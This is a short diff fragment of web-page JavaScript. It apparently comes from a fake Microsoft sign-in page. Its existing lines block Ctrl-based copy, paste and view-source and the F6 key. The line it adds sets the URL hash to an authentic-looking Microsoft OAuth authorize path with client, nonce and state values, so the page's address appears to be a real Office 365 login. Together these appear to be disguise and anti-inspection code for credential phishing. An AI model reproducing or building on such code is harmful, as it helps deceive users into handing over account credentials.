@@ -61,4 +61,4 @@
             if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) 
             return false;
     };
-   
+    location.hash = '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637997421784559400.NDBkZmEzMGEtYzcwOS00MzBjLWEyODYtYWRlZDBiOTU2M2FlN2FiZTAwYzItOGUyOC00YzBlLWJkMWQtNDNkNmNhNGU5YThk&ui_locales=en-US&mkt=en-US&client-request-id=7f29f884-c0e2-4b4a-9e3a-c3a9744a3982&state=Z4fjjaAL6ZnRtmNVRWzHivnC0JaQccLPngyfkg18aU6ayUDbLsf48WgEuAI7RoEdxavE8TQLtBtCNO76Mtp3phtR3iDEXrbhHABjY7xzlU2yKdtYzbBNP3eFj753u7swLDFU8LeLBU8CIWZUURZdnDYHX9kSAL5n1IOJTY0wZb-066b5Wj8mI4OSs8iTTc67CsB7ksraYAgoboMS9vuPqMeA-hTdWs86qMsnMjZIawxcq8-nB_mQiGVPmXug-aVuExKTH8czcN0Z4-EBMRGNVFgWRuTJ-V33K6Ks4z69ZwA&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.16.0.0'
